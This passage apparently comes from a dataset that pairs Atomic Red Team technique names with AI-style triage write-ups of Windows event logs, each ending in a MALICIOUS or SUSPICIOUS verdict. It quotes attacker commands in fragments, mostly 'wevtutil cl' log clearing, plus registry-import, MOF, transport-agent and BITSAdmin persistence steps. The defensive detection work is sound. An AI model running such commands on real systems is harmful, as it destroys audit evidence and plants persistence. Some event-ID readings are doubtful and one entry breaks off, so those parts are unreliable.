   - The logs indicate activities involving high integrity levels (e.g., `Security Authority/System` actions), which may reflect privilege escalations or existing elevated access being utilized.

**Assessment:**
The combination of event log clearing, use of PowerShell with potentially harmful WMI persistence scripts, and the context in which these utilities are running all point towards a coordinated and deliberate attempt to hide malicious activity on the system.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately conduct a full forensic analysis of the affected host to confirm and contain any breach.
- Review and isolate any accounts or users involved in the suspicious activity; in this case, `admin_test`.
- Implement stricter logging policies and monitoring for abnormal usage of administrative tools and logs.
- Review and harden access control to sensitive logs and system utilities that could be exploited.
- Engage with incident response team to assess the broader impact within your network and initiate post-breach recovery plans.

Given the nature of these activities and their potential negative impact, prompt and effective response actions should be prioritized."

1. **PowerShell Logs:**
   - There are numerous PowerShell events (EventID: 600) where `powershell.exe` executes a command using Copy-Item from the `AtomicRedTeam\T1546.011` directory to the `C:\Windows\apppatch\Custom` directory. The directory path and specific `T1546.011` identifier indicate a simulation or execution of a known attack technique (T1546.011), often associated with persistence mechanisms in ATT&CK framework.
   - The presence of `AtomicRedTeam` implies possible red teaming activity or testing for vulnerabilities using known MITRE ATT&CK techniques.

2. **Sysmon Logs:**
   - The execution of the `whoami.exe`, `wevtutil.exe` (with commands to clear event logs), and frequent appearances of `conhost.exe` often used for console windows may indicate attempts to retrieve system and user information and cover up tracks by clearing event logs.
   - The `wevtutil.exe` command `epl Microsoft-Windows-Sysmon/Operational ...` indicates exporting logs which may be used for gathering information.
   - The processes are primarily run under the context of `SERVER002\admin_test` with high integrity level, suggesting possible privilege abuse or execution with elevated permissions.

3. **Security Logs:**
   - The event with ID 1102 denotes the security log was cleared by the user `admin_test`, which is a common tactic to hide malicious activities.
   
4. **System Logs:**
   - EventID 104 indicates both the System and Windows PowerShell event logs were cleared by the user `admin_test` around the same time as other suspicious command executions. This behavior is consistent with attempts to hide evidence of previously executed commands.
   
5. **Application Logs:**
   - These primarily show normal update activities related to Microsoft Edge, which may not be directly related to malicious activities but should be reviewed in context with other events, especially given the system-level permission context.

### Assessment:

The combination of PowerShell command execution related to known attack vectors (`T1546.011`) and multiple logs being cleared by `admin_test` strongly aligns with potential malicious activity. Clearing event logs is a tactic frequently used to conceal actions taken by an attacker.

### Resolution:

**Resolution: MALICIOUS**

Given the execution of simulation tools and the active concealment attempts through event log clearance, the activities outlined in these logs indicate malicious behavior. Immediate actions and further investigations are recommended, potentially involving:
- Isolating the affected system.
- Conducting a deeper forensic analysis to determine any compromise extent.
- Reviewing user access logs and recent changes.
- Considering resetting credentials for affected accounts.

System administrators should be alerted to mitigate any potential security breach."
Load custom DLL on mstsc execution,"Based on the provided logs, several events indicate suspicious activity that warrants further investigation:

1. **Log File Clearing Events**:
   - The `EventID 104` in the system log indicates that the ""System"" and ""Windows PowerShell"" logs were cleared by the user `admin_test`. This is often considered suspicious as attackers commonly clear log files to cover their tracks following malicious activities.
   - The `EventID 1102` in the security log indicates the security event log was also cleared. The combination of these log clearings is a strong indication of potential malicious activity.

2. **Registry Modification**:
   - `Sysmon EventID 1` shows a command line execution by `cmd.exe` to modify the registry key `HKLM\SOFTWARE\Microsoft\Terminal Server Client\ClxDllPath` to point to `C:\Windows\System32\amsi.dll`. This behavior can be indicative of tampering or preparation for privilege escalation or persistence mechanisms.

3. **Process Execution**:
   - Multiple processes (`wevtutil.exe`) were executed to clear different log channels. The usage of `wevtutil.exe` by a non-standard application or user without clear operational context can be suspicious.
   - The processes executed by the user `admin_test` have a high integrity level, suggesting potentially elevated privileges were utilized.

4. **Time Manipulation**:
   - There are security logs (`EventID 4616`) indicating system time modification. Changing system time is also a suspicious behavior associated with attempts to evade detection or modify timestamps on log events.

5. **Frequent Use of System Utilities**:
   - The use of utilities like `whoami.exe`, `hostname.exe`, and frequent invocation of `conhost.exe` suggests a pattern often seen during manual investigation or lateral movement activities by attackers.

**Assessment**:
- The combination of log clearing, registry modification, system time changes, and use of system utilities suggests coordinated actions to obfuscate activities, maintain persistence, and potentially explore or exploit the system.

**Threats or Risks Identified**:
- High risk of system compromise due to indicators of an attacker trying to maintain stealth and persist within the system.

**Guidance**:
- Initiate a comprehensive incident response plan to thoroughly investigate the host.
- Consider isolating the affected system from the network to contain any potential threat.
- Conduct a forensic analysis to understand the scope and impact of the compromise, if confirmed.

**Resolution**:
- **MALICIOUS** - The activity detected within the logs strongly suggests a malicious compromise of the system. Immediate actions are needed to assess and mitigate the threat."
Bitsadmin Download (PowerShell),"After careful analysis of the provided Windows event logs, the following observations and assessments are made:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs**:
   - Multiple occurrences of the `wevtutil` command used to clear event logs, specifically the Application, Security, and Windows PowerShell logs. 
   - This behavior is conducted by the user `SERVER002\admin_test`, which is unusual unless conducted by an authorized administrator for maintenance purposes. Clearing event logs can be an indication of an attempt to cover tracks post-compromise.

2. **PowerShell Activity**:
   - PowerShell commands are being utilized to download scripts from a GitHub repository (URL: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md`), suggesting the possible execution of post-exploitation scripts or tests, potentially related to red Canary Atomic Threat coverage.
   - The use of `Start-BitsTransfer` indicates file transfer activity, which often should be scrutinized, especially if unrecognized external sources are involved.

3. **Service Stopping**:
   - Edge Update services have stopped at unusual times, and there seems to be associated activity with installs and updates. While this could be legitimate, it is also a vector used in some attacks to initially compromise or further implant software.

### Potential Indicators of Malicious Activity:

- **Log Clearance**:
  - Event ID 1102 (security logs cleared) and System logs cleared without a preceding explanation or legitimate maintenance context are potential indicators of an intent to obfuscate malicious activity.

- **External Script Download**:
  - Automatic downloads and execution of scripts from outside known repositories should raise flags, especially if the executing context or purpose isn't clear. The Atomic Red Team provides simulated attacks for detection, which could be benign in controlled environments but suspicious otherwise.

### Assessment:

The combination of cleared event logs, power shell activities specifically with external script download, and service anomalies could be indicative of malicious activity. The clearing of logs is a particularly strong indicator that someone may have been trying to cover their tracks after an intrusion. While the Edge Update and PowerShell activities on their own might be benign when considered in the context of regular system maintenance or updates, combined with the log clearing, they raise a higher level of concern.

### Resolution:

**MALICIOUS** - The activity within the logs, including the clearing of security and application logs, downloading and execution of scripts from an external repository, and possible obfuscation with service terminations, points towards potential malicious behavior. Immediate containment, further investigation, and review of network and system access controls are recommended. A detailed forensic investigation is necessary to confirm the scope of the potential security breach and mitigate any identified threats."
Install AppInit Shim,"Based on the provided logs, several indicators suggest potentially malicious activity, although some actions could be explained by legitimate administrative tasks. Here's a step-by-step analysis:

### Security Log Analysis:
1. **Event ID 1102**: The Security logs have been cleared at `2024-10-27 14:08:16.3573804`. Log clearing, especially without prior notice or justifiable reason, is usually a strong indicator of malicious intentions, likely to cover tracks.
   
2. **Event ID 4624 and 4672**: Repeated logon and special privilege assignments by the `SYSTEM` account (`S-1-5-18`). While normal in system operation, the timing and repetition should be scrutinized given the other activities.

3. **Event ID 5379**: Involves attempts to access potential credential stores, which are repeatedly seen failing (`ReturnCode=3221226021`). This could indicate unsuccessful attempts to breach credentials.

4. **Event ID 4798**: Processes involving account queries to various user accounts (`Administrator`, `admin_test`, etc.) seem unusual and should be checked against standard operation procedures for user enumeration tasks. All actions are executed by `taskhostw.exe`, further investigation into this process is warranted.

### Sysmon Log Analysis:
1. **wevtutil.exe Execution**: The process `wevtutil.exe` is used to clear event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`). This behavior is consistent across multiple command executions and indicates an attempt to remove traces, likely malicious. This tool is a legitimate Windows utility, but usage for log clearing, specifically, is a red flag.

2. **PowerShell Execution**: The log entry for `powershell.exe` by `admin_test` appears without a command. The absence of context could indicate unauthorized usage, typically seen in exploitation or post-exploitation activities. 

3. **Registry Modification Attempt**: The command execution `reg.exe import T1546.010.reg` by `cmd.exe` under `admin_test` user hints at a potential persistence setup. The Atomic Red Team paths suggest the use of a testing or simulation tool, which can be valid for security exercises but should be validated if authorized by IT/security teams.

### System and Application Logs:
1. **Log Clearance in System**: The system logs were cleared (`Event ID 104`), similar to Sysmon and security logs. This action further corroborates intentional cover-up acts.

### Conclusion:
There are clear indicators of potentially malicious activities, particularly the unauthorized clearance of system and security logs, attempts to access accounts and credentials, and suspicious modification of registry settings potentially indicating persistence techniques. 

Given these observations, the resolution for this analysis is:

**MALICIOUS** – The evidence of log clearing, registry changes, and possible account reconnaissance with a combination of administrative tools suggests this machine is compromised or at significant risk without further analysis. 

### Recommendations:
- Conduct a full forensic analysis of the affected machine.
- Check network activity for this host around the time in question for unusual communications.
- Review user permission changes and investigate all processes executed with elevated privileges.
- Notify and engage the incident response team to isolate and remediate the machine immediately. 
- Validate any scheduled or regular administrative activities that might explain the PowerShell and registry access under a test user (admin_test) or any deliberate exercises that might have inadvertently triggered these alerts."
Persistent Code Execution Via Excel Add-in File (XLL),"After thoroughly reviewing the provided Windows event logs, a number of potentially suspicious activities have been identified:

1. **PowerShell Events**: Several logs indicate the execution of a PowerShell script on the host machine (`Server002`). The script uses the `New-Object` command to interact with a COM object (`Excel.Application`), then uses conditional statements to determine whether Office is 64-bit or 32-bit, subsequently copying a Dynamic-Link Library (DLL) file (`.xll`) into the Microsoft Excel Add-Ins directory. This behavior is typically associated with attempts to persist a malicious Excel add-in, using a technique that is commonly highlighted as suspicious or malicious, often related to MITRE ATT&CK technique T1137.006 (Office Application Startup).

2. **Event Log Clearing**: In the Security logs, event ID 1102 indicates that the Windows Security event logs were cleared by the user `admin_test` shortly before these PowerShell activities. Clearing of event logs is a common technique used by attackers to hide their tracks after conducting malicious activities.

3. **Wevtutil Usage**: Sysmon logs show multiple uses of `wevtutil.exe` to clear logs (`wevtutil cl`) across different logs (Security, System, and PowerShell). This was done by the same user, `admin_test`, shortly before or during the potentially suspicious PowerShell activities, reinforcing the effort to cover tracks and making it more suspicious.

4. **User Context**: The operations, including PowerShell script execution and log clearing, were performed under the `SERVER002\admin_test` user account, indicating the activity was conducted with a user having administrative privileges which makes it more critical as administrative access can lead to critical configurations and potential privilege escalations.

Given these observations, it is essential to note the combination of suspicious script execution and log clearing actions typically indicates an attempt to conduct malicious activities stealthily.

**Resolution**: MALICIOUS

**Guidance on how to proceed**:
- Immediately isolate the affected system to prevent further malicious actions or potential spread within the network.
- Investigate the user's credential (`admin_test`) usage and behavior on other systems within the organization to determine if the behavior is part of a larger attack campaign.
- Perform a full forensic analysis of the system to determine the extent of any compromise or data exfiltration.
- Review and adjust security policies related to PowerShell script execution, auditing, and controls to prevent such unauthorized and malicious activity.
- Ensure that all systems are adequately patched, especially for vulnerabilities that are commonly exploited by such techniques.
- Increase monitoring and alerting around critical activities including event log clearing, especially around sensitive account login events and PowerShell usage."
Create a new account similar to ANONYMOUS LOGON,"### Analysis of Windows Event Logs:

#### Overview:
The logs provided span several categories, including Sysmon, Security, Application, and System logs. The primary objective is to identify any suspicious or potentially malicious activities indicated by these logs.

#### Detailed Analysis:
1. **Sysmon Logs:**
   - The logs show various commands executed with high privilege levels (e.g., NT AUTHORITY\SYSTEM, SERVER002\admin_test).
   - The usage of typical Windows administration tools like `whoami.exe`, `wevtutil.exe`, and `conhost.exe` appears normal in a locked-down server environment (running under SYSTEM context).
   - However, a series of `wevtutil.exe` commands (Event IDs 17954, 17958, 17962, 17966, 17970, etc.) within a short timeframe indicate that someone is attempting to clear Windows event logs such as Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell. This is atypical and often used to cover tracks in an unauthorized operation.
   - Event ID 17983 shows the execution of `cmd.exe` with the command to add an ""ANONYMOUS LOGON"" user with high privileges. This strongly indicates malicious activity as it creates a potentially unauthorized access point.

2. **Security Logs:**
   - Event ID 1102 indicates the Security log was cleared. Coupled with the Sysmon logs, this strongly suggests an attempt to remove traces of activity.
   - The timestamps of time changes (Event IDs 30351, 30352) portray possible tampering with system time. While not inherently malicious, this could be used in conjunction with log cleardown to confuse any automated monitoring systems.

3. **Application and System Logs:**
   - The logs contain standard entries that do not show direct relations to executed commands or user activity.
   - Event ID 3567 in the System log mentions a security update application, which aligns with typical system behavior.
   - Event ID 3566 confirms PowerShell logs were cleared, which, combined with other findings, is suspicious and helps in obscuring unauthorized actions.

4. **PowerShell Logs:**
   - The PowerShell logs are suspiciously missing. Given that there is evidence of their examination and likely manipulation or deletion, it raises concerns.

#### Conclusion:
- There is a significant presence of actions typically associated with attempts to obscure unauthorized or potentially malicious activities, such as user creation, log clearing, and possible misconfigurations or manipulations.
- The presence of log clearing events, the creation of an anonymous logon user, and possible system time manipulation strongly indicate a security incident and compromise.

### Assessment and Resolution:
- **Resolution**: MALICIOUS
- **Guidance**: Immediate investigation and remedial action are necessary. The user account in question (""admin_test"") should be reviewed for legitimacy. Any unauthorized accounts or access points should be disabled and removed. Consider restoring logs and scrutinizing for additional anomalies. It would be prudent to conduct a full system audit and enhance monitoring controls to prevent similar issues in the future."
Install MS Exchange Transport Agent Persistence,"### Analysis of Windows Event Logs

The logs provided from the Windows host `Server002` demonstrate signs of unusual and potentially malicious activity. Here are the notable observations:

1. **Event Clearing**:
   - Multiple instances throughout the logs where event logs, particularly within the `Security`, `System`, `Application`, and `Windows PowerShell` channels, have been cleared. This is recorded in the `Security` log with Event ID `1102` and in the `System` log with Event ID `104`. Cleared logs are often an attempt by malicious actors to cover their tracks after performing unauthorized actions.

2. **Privilege Use**:
   - The logs reveal that the user `admin_test` executed commands with high privileges. Event ID `4672` in the `Security` log indicates that the account has used privileges like `SeDebugPrivilege`, `SeSystemEnvironmentPrivilege`, and others, which are usually associated with administrative or high-level operations.

3. **Command Line Executions**:
   - The `Sysmon` log indicates several instances of command-line utility `wevtutil.exe` being used to clear logs, which are suspicious actions not typically seen in benign scenarios.
   - Notably, there is the execution of `powershell.exe` with a command to install and enable a transport agent:
     ```
     powershell.exe & { Install-TransportAgent -Name Security Interop Agent ... }
     ```
     The usage of PowerShell in this context, particularly with installing software related to Exchange Server, should be investigated further as it might indicate a compromise.

4. **Process Execution**:
   - Several processes such as `PowerShell.exe`, `wevtutil.exe`, and uncommon command lines imply the possibility of execution of scripts or commands by an actor with system access.
   - The execution of utilities like `whoami.exe` under a high integrity context suggests enumeration of system details by the user `SERVER002\\admin_test`.

### Threat Assessment and Resolution

The combination of multiple event log clearings, use of privileged commands, suspicious PowerShell activity, and the nature of the tools and commands being executed indicates high-risk activities. The anomalies in execution patterns and process activities are consistent with behaviors observed in compromised systems where adversaries perform unauthorized actions and hide evidence.

**Final Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Response**:
   - Disconnect the affected host from the network to prevent any possible lateral movement or data exfiltration.
   - Preserve the state of the system for forensic analysis. Ensure a full disk image is captured.

2. **Investigation and Analysis**:
   - Further investigate the extent of the compromise, potentially using endpoint detection and response (EDR) tools.
   - Examine account `admin_test` for any unusual account activity or changes in permissions.
   - Inspect all logged PowerShell scripts and commands, especially those dealing with transport agents or log modifications.

3. **Remediation**:
   - Change all credentials for accounts that have been used on `Server002`.
   - Patch any vulnerabilities and ensure that the latest security updates are applied.
   - Restore the system from a clean, trusted backup if necessary and feasible.

4. **Long-Term Improvements**:
   - Consider implementing stricter privilege access management (PAM).
   - Review and enhance monitoring and alerting for similar activities in your network.
   - Conduct a comprehensive security audit to identify and resolve other potential vulnerabilities or misconfigurations within your infrastructure."
"Persist, Download, & Execute","Upon analyzing the provided Windows event logs, several activities are indicative of potential malicious behavior:

1. **Clearance of Event Logs (EventID 1102 in Security Log and EventID 104 in System Log) and Time Change (EventID 4616 in Security Log):**
   - The clearance of event logs, especially security logs, is a common tactic used by attackers to hide their activity. The `admin_test` account was involved in clearing logs.
   - Event log clearance was accompanied by a time change from `2024-10-25 17:02:59` to `2024-10-25 17:02:53`. Time manipulation is another tactic that can be used to cover tracks or interfere with log timestamping.

2. **Use of BITSAdmin for Suspicious File Operations (EventID 1 in Sysmon Log):**
   - BITSAdmin was used to create a task (`AtomicBITS`) and add a file from a suspicious external source (raw.githubusercontent.com). This is potentially indicative of a command and control (C2) communication or malicious payload retrieval.
   - The command `bitsadmin.exe /addfile` and `/setnotifycmdline` involving `notepad.exe` further suggests automation of post-compromise activities using BITSAdmin.

3. **Unusual Use of System Utilities (Sysmon Events):**
   - Multiple executions of `wevtutil.exe` with the command `cl` (which might imply 'clear logs') by `admin_test` are noted. This further aligns with log-clearing actions inferred earlier.

4. **Unauthorized Logons and Privileges Assigned (EventID 4624 and 4672 in Security Log):**
   - Multiple logons with elevated privileges (including SeDebugPrivilege) were noted for the `admin_test` account, suggesting unauthorized privilege escalation or use.

5. **Presence of Potentially Malicious Tools (EventID 1 in Sysmon Log):**
   - The spawning of `cmd.exe` executing a complex BITSAdmin command sequence, likely aimed at executing remote content and possibly used in simulated attack exercises, usually indicates direct or script-based malicious activity.

Based on these observations, it is reasonable to conclude that the logs exhibit multiple signs of malicious activity, including log tampering, potential data exfiltration, unauthorized access, and privilege escalation. These activities strongly suggest an active compromise or post-exploitation actions on the host.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Initiate an immediate incident response to identify and contain the threat.
- Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.
- Conduct a detailed forensic analysis to understand the attack vector and scope.
- Review and elevate security controls, especially around log management and alerting for critical events like log clearance.
- Prepare a summary report and communicate findings to relevant stakeholders for appropriate action."
Windows MOFComp.exe Load MOF File,"Upon reviewing the provided logs, several indicators suggest potential malicious activity:

1. **Clearing Event Logs**:
   - The security log entry shows that the event logs were cleared (EventID 1102). This occurred under the username `admin_test`, which often suggests an attempt to cover tracks after potentially malicious activities. The clearing of logs in itself is a suspicious indicator, especially if not part of regular, documented maintenance.
   
2. **Executable Activity**:
   - Execution of `wevtutil.exe` to clear multiple logs (`Microsoft-Windows-Sysmon/Operational` and `Application`) is observed multiple times. The command used by `admin_test` suggests log clearing: `""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""`. This is often associated with malicious behavior intended to hide traces.
   - Execution of PowerShell with a specific command line: `& {c:\windows\system32\wbem\mofcomp.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1546.003\src\T1546.003.mof""}`. This command uses a known tool (Atomic Red Team) for security testing and simulation, possibly as a disguise for real attacks or during a red team exercise, which could be considered suspicious if unauthorized.

3. **Related Suspicious Processes**:
   - The `mofcomp.exe` executed with paths related to Atomic Red Team scenarios could imply attempts at persistence or payload delivery.
   - The frequent use of `conhost.exe` related to process executions spawned by `wevtutil.exe` and `mofcomp.exe` further suggests an effort at scripting or automation associated with these potentially harmful actions.

Taking the above points into account:

- The presence of logs being cleared is a critical indicator of potential compromise.
- The use of administrative utilities (`wevtutil.exe`, `PowerShell`) and the context of their execution suggest actions to possibly evade detection.
- Execution of testing tools like Atomic Red Team without prior consent or knowledge of such activities as a part of security testing by authorized parties indicates a risk.

Given all the evidence, I assess the situation as:
- **MALICIOUS**: The combination of log clearing, use of administrative tools like `wevtutil`, and the Atomic Red Team scenario in an unmanaged or undocumented context leads to an inference of probable malicious activity.

**Guidance**:
- Immediately conduct a containment and eradication procedure.
- Review the access and actions of `admin_test` to ensure this account has not been compromised.
- If unauthorized, neutralize any lingering threats and clean up any unauthorized scripts or tools.
- Enhance monitoring and apply security patches if any vulnerabilities are found."
Persistent Code Execution Via Word Add-in File (WLL),"Based on the analysis of the provided logs, there are several activities that seem unusual and might indicate malicious behavior:

### Analysis:

1. **Windows PowerShell Logs:**
   - The PowerShell logs show a script that creates a COM object for Microsoft Word and manipulates files within the Word Startup directory. The script attempts to copy files named `wordwll_x64.wll` or `wordwll_x86.wll` depending on the architecture of the Office installation. It further stops and starts the `WinWord` process.
   - The path `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1137.006\bin\Addins` and the context suggest this could be related to a testing or attack simulation tool known as Atomic Red Team, which is used to test security controls by simulating adversary techniques.
   - The PowerShell script includes no proper logging or verbose output typical of routine administrative tasks, which in conjunction with the Atomic Red Team path makes this highly questionable.

2. **System Logs:**
   - The system logs highlight the clearing of event logs (Event ID 104) by a user `admin_test`. The clearing of logs, especially PowerShell logs, could indicate an attempt to cover up tracks after executing potentially malicious activities.

3. **Sysmon Logs:**
   - The Sysmon logs reveal multiple instances of `wevtutil.exe` being used to clear various event logs (System, Application, and Security) within a short timeframe. This again aligns with attempts to cover tracks.
   - A process was initiated by `admin_test` using `wevtutil.exe` to clear logs, which is a classic indicator of log evasion techniques used post-attack.

4. **Security Logs:**
   - Security logs further corroborate the clearing of event logs (Event ID 1102) which affirms the attempts to hide the footprints from forensic analysis.

5. **Application Logs:**
   - The application logs do not show direct malicious activity but show routine service stops around the same time as other suspicious activities. 

### Assessment and Conclusion:

- **Indicators of Compromise:**
  - Usage of PowerShell with scripts typical of security testing tools.
  - Log clearing activities, specifically targeting PowerShell, System, and Security logs.
  - Execution timestamps and commands suggest possible steps of unauthorized or malicious behavior.

### Resolution:

- **MALICIOUS**: The logs show clear signs of potentially malicious behavior. The combination of PowerShell script execution, the presence of Atomic Red Team test paths, and systematic clearing of logs are strong indicators of potentially malicious activities orchestrated to test defenses or simulate an attack scenario.

### Guidance:

- **Immediate Actions:**
  - Begin an incident response process to identify the source of scripts and how they were deployed.
  - Validate if the Atomic Red Team execution was authorized, and document the scope and objective.
  - Audit the permissions and activity of `admin_test` to understand how access was granted and whether it was legitimate.
  - Increase monitoring for any further suspicious PowerShell or log-clearing activities.
  - Consider reverting affected systems to a known good state if unauthorized activity is confirmed. 

- **Further Investigation:**
  - Review endpoint detection logs across your infrastructure to identify any further execution of similar PowerShell scripts.
  - Audit access logs and correlate them with logon times to determine unauthorized access. 
  - Engage with threat intelligence to identify whether such activity aligns with known attack patterns or adversary techniques."
Web Shell Written to Disk,"Upon analyzing the provided Windows event logs, several events stand out as potentially indicative of suspicious and possibly malicious activity:

1. **Log Cleared Events**:
   - EventLog ID 104 (System and Windows PowerShell channels) and Security Log ID 1102, indicating log clearing activities were performed by the user account `admin_test`. These actions can be an indicator of an attempt to cover tracks after conducting unauthorized or malicious activities on the system.

2. **Command Line Utility Usage**:
   - Multiple occurrences of `wevtutil.exe cl <channel>` by the `admin_test` user, which is used to clear event logs. This coincides with the `EventLog ID 104 and 1102` entries, meaning the logs for System, Application, and Windows PowerShell were cleared around the same time. Such behavior is commonly associated with malicious actors attempting to hide evidence of their activity.

3. **Suspicious xcopy Command Execution**:
   - The presence of a `cmd.exe` process executing an `xcopy` command (Process ID 6564) to copy files from a potentially temporary directory to the `C:\inetpub\wwwroot`, which is typically the default directory for web server files on Windows systems. This could indicate a web directory infiltration or preparation for malicious hosting.

4. **Processes Executed with High Integrity Level**:
   - Several processes like `whoami.exe`, `cmd.exe`, and `xcopy.exe` were executed under the `High` integrity level by the `admin_test` user. This demonstrates that potentially sensitive or critical processes were run with elevated privileges, which could further support malicious activity if such commands are unexpected on that system.

5. **Unusual Use of System Utilities**:
   - Despite being normal utilities, the specific usage of `hostname.exe`, `whoami.exe`, and multiple instances of `conhost.exe` might suggest reconnaissance activities on the system to gather information about the host and user permissions.

6. **Edge Update Activity**:
   - Numerous `MicrosoftEdgeUpdate.exe` activities were noted, which might typically be benign related to software updates. However, in conjunction with the other activities, further examination of the legitimacy of these updates is warranted.

**Assessment and Conclusion**:
- **Suspicious**: The presence of cleared event logs, specific command line executions with elevated privileges, potential infiltration of the web directory, and reconnaissance-like activities collectively suggest activity that is suspicious and deserves further investigation. The actions taken could align with tactics used by adversaries to establish footholds, escalate privileges, and cover tracks on compromised systems.

**Guidance on How to Proceed**:
1. **Immediate Network Isolation**: Isolate the host `Server002` from the network to prevent potential lateral movement.
2. **Forensic Image**: Obtain a forensic image of the system to preserve the current state for further detailed analysis.
3. **Investigate User Actions**: Examine the `admin_test` user's recent actions, including any associated accounts or systems, for unauthorized or unusual activities.
4. **Determine Scope**: Assess whether any unauthorized changes were made, and attempt to identify additional compromised hosts or files.
5. **Review Backup and Restoration**: Evaluate backup integrity and consider reverting to a non-compromised state post thorough investigation."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"After analyzing the provided Windows event logs, the following points stand out:

1. **Sysmon Crash Events**: There are several entries in the Application log related to a crash of `Sysmon.exe` (Event IDs 1000 and 1001) following an access violation exception (c0000005). These can be considered as significant indicators because Sysmon is a critical system monitoring tool commonly used for threat detection. A crash might signify an attempt to disable or evade monitoring.

2. **PowerShell Activity**: The Windows PowerShell log contains a script execution tied to a well-known persistence method leveraging WMI (Windows Management Instrumentation) event subscriptions. The `Set-WmiInstance` commands are setting up an `ActiveScriptEventConsumer`, utilizing VBScript to launch `notepad.exe`. This behavior is typical of persistence mechanisms which attackers may use to maintain access to a system.

3. **Event Log Clearing**: Multiple log-clearing operations are recorded in the System log. Events indicate the clearing of critical security and system logs (Event ID 104 with usernames involved), which is suspicious behavior often correlated with attempts to remove traces of malicious activity.

4. **Wevtutil Command Usage**: Multiple entries in the Sysmon log show `wevtutil` commands being executed. This utility is often used to manage event logs. Its usage might not be inherently malicious, but in combination with log clearance, it raises suspicion.

5. **Security Privileges**: Elevated privileges for `admin_test` are noted (Event ID 4672), including `SeDebugPrivilege` and others that might be exploited for malicious activity or privilege escalation.

6. **Security Logs**: Event ID 1102 indicates the clearing of the security log, which is a significant anomaly. Clearing security logs is typically associated with malicious activity, aimed at covering the intruder's tracks.

Based on the above analysis, these logs display several indicators consistent with malicious activity, including evidence of log clearing, suspect PowerShell usage for persistence, crashes of security monitoring software, and elevated privilege operations.

Persistent Code Execution Via Excel VBA Add-in File (XLAM),"**Analysis and Findings**

Upon reviewing the provided logs, the following observations stand out as suspicious or indicative of potential malicious activity:

1. **Security Log Clearing Event (Event ID 1102)**:
   - The Event ID 1102 signifies that the security event log was cleared. This is a typical indicator of malicious activity or an attempt to cover tracks by a user or a process. The log indicates that this action was performed by the user `admin_test` on `SERVER002`.

2. **Sysmon Logs**:
   - Multiple events show the execution of `wevtutil.exe` with command-line arguments aimed at clearing various event logs (""cl Microsoft-Windows-Sysmon/Operational"", ""cl Security"", ""cl System"", ""cl Application""). This further corroborates an attempt to cover tracks by deleting event logs.
   - The clearing of logs directly after suspicious PowerShell executions strongly indicates an attempt to hide these operations.

3. **PowerShell Activity**:
   - A PowerShell script runs with a command that attempts to copy a file from the `AtomicRedTeam` directory to Excel’s startup location. Atomic Red Team is a known testing suite for security research, often associated with adversary simulation activities. The command appears to mimic tactics, techniques, and procedures (TTPs) of attackers.
   - There is also a logged failure in attempting to perform this operation (`CopyItemProviderException`), which adds to the suspicion that the script execution might be part of attack simulation or a real unauthorized access attempt.

4. **Log Check with Application and System Logs**:
   - The Application log shows an Edge update service process being stopped, which in itself seems benign.
   - The System log includes details of the same user (`admin_test`) clearing event logs for both System and PowerShell, reinforcing the suspicion of an attempt to evade detection.

**Assessment and Resolution**

Given the above findings, the sequence of operations suggests a strong indication of malicious activity. The orchestration around log clearing points to potential unauthorized or adversarial actions. This activity should be treated as a high-security incident.

Resolution: **MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions**:
   - Isolate `Server002` from the network to prevent further potential damage.
   - Inform the incident response team to contain and investigate further.

2. **Investigate User Activity**:
   - Conduct a detailed review of recent activities by the `admin_test` user account. Assess if this user’s credentials may have been compromised.

3. **Log Recovery**:
   - Attempt to recover logs using available backups, if any.

4. **Security Measures**:
   - Strengthen security policies concerning access controls and audit logging.
   - Engage in threat hunting across the network to identify any other affected or compromised systems. 

5. **Post-Incident Actions**:
   - Review and tighten PowerShell execution policies.
   - Conduct a security post-mortem to understand the holes exploited and how to better defend against such activities in the future.

Due to the nature and context of activities logged, it is critical to address this potential breach promptly and thoroughly."
Google Chrome Load Unpacked Extension With Command Line,"After analyzing the provided event logs, the following details stand out:

### Analysis:

1. **Event Log Clear Events**:
   - There are several instances of event logs being cleared:
     - Event ID 104 in the System log indicates that the ""System"" and ""Windows PowerShell"" logs were cleared by the user `admin_test`.
     - Event ID 1102 in the Security log indicates that the Security logs were also cleared by the user `admin_test`.

2. **PowerShell Activity**:
   - A suspicious PowerShell script was executed that involves downloading and executing a Chromium build and uBlock Origin Lite extension:
     - The script uses `Invoke-WebRequest` to download potentially unnecessary files for the environment and sets locations to temporary directories.
     - The execution of modified or custom Chrome without direct justification in enterprise settings is often flagged for further investigation as it could be indicative of persistence mechanisms or data exfiltration tools.
  
3. **Process Execution and Elevated Privileges**:
   - The Sysmon logs show the execution of `wevtutil.exe` and `conhost.exe` multiple times in sequence, with command lines to clear event logs. This behavior is a common tactic to evade detection or hide traces of malicious activities.

4. **High Integrity Level**:
   - The processes run with a High integrity level, indicating they may have been run with administrative privileges, consistent with activities like log clearing.

5. **EdgeUpdate**:
   - Multiple executions of `MicrosoftEdgeUpdate.exe` regarding updates and services. However, while this could be normal, the context of these events alongside suspicious PowerShell execution suggests it should be reviewed further to ensure updates are legitimate and not used for lateral movement or payload execution.

### Conclusion:

The logs exhibit suspicious behaviors including multiple unauthorized log clearings, the execution of unusual PowerShell scripts, and potential exploitation of system utilities for evasion tactics. Given these observations, these logs demonstrate sufficient activity that warrants further investigation.

### Resolution:

- **SUSPICIOUS**: The logs exhibit activities that are not typical for regular user or system processes and require further investigation.

### Suggested Actions:

1. **Immediate Investigation**:
   - Perform a security audit on the user account `admin_test` including authentication logs and access history.
   - Gather additional contextual data for any unexpected network connections or data exfiltration attempts related to the PowerShell script's execution time.
  
2. **Review System State**:
   - Check for malicious persistence mechanisms or unusual software installations.
   - Inspect integrity and origin of the Chromium and extensions downloaded and executed.

   - Enhance monitoring on the system, setup alerts for similar activities, and restrict overuse of PowerShell and administrative commands where possible.

4. **Audit Policy and Access Controls**:
   - Strengthen auditing policies to prevent unauthorized log editing or clearing, and enforce robust privilege management controls.

